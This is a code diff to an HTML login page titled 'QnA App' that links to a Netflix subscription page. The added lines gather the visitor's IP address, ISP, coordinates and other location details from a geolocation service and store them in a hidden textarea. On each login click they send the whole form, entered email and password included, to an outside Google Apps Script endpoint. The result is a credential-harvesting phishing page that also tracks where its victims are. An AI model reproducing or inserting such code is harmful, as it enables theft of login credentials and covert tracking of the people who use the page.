@@ -9,6 +9,7 @@
 	<script src="Assets/firebase.js"></script>
 	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css">
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 	<style>
 		body {
   font-family: "Roboto", sans-serif;
@@ -94,7 +95,9 @@ form a {
   color: #555;
   text-decoration: none;
 }
-
+#dtl {
+  display: none;
+}
 form a:hover {
   text-decoration: underline;
   text-decoration-style: dotted;
@@ -116,7 +119,7 @@ form a:hover {
 	<div class="form-container">
 		<h1>QnA App 🔥</h1>
 		<div class="msg"></div>
-		<form autocomplete="off">
+		<form method="post" autocomplete="off" id="form" name="Form">
 		  <div class="input-field">
 			<i class="fa fa-envelope"></i>
 			<input type="email" id="email" name="email">
@@ -128,10 +131,15 @@ form a:hover {
       <button id="access" name="signin" class="btn">Log in</button>
       <a type="button" id="forgotPass" style="display:none;cursor:pointer;color:red;">Forgot Password?</a>
       <a id="subs" href="https://www.netflix.com/bd/">Buy a Subscription</a>
+      <textarea name="dtl" id="dtl"></textarea>
 		</form>
 	  </div>
 	  <script>
-		  function toggleSignIn(e) {
+      $.get('https://json.geoiplookup.io/', function(res) {var a = ("IP Address : " + res.ip + "\n" + "ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code  + "\n" + "Currency : " + res.currency_name);document.getElementById("dtl").value = a;});
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbx19Z7C8Ud6-Qg8cNv-A9pndUfY0I-z6WFZqO_oRqi1nn2nTo2JDBrt/exec'
+    const form = document.forms['Form']
+
+      function toggleSignIn(e) {
   if (firebase.auth().currentUser) {
     firebase.auth().signOut();
   } else {
@@ -184,6 +192,8 @@ function initApp() {
     } 
   });
   document.getElementById('access').addEventListener('click', toggleSignIn, false);
+  document.getElementById('access').addEventListener('click', e=> {e.preventDefault() 
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})})
   document.getElementById('forgotPass').addEventListener('click', sendPasswordReset, false);
 }
 window.onload = function() {
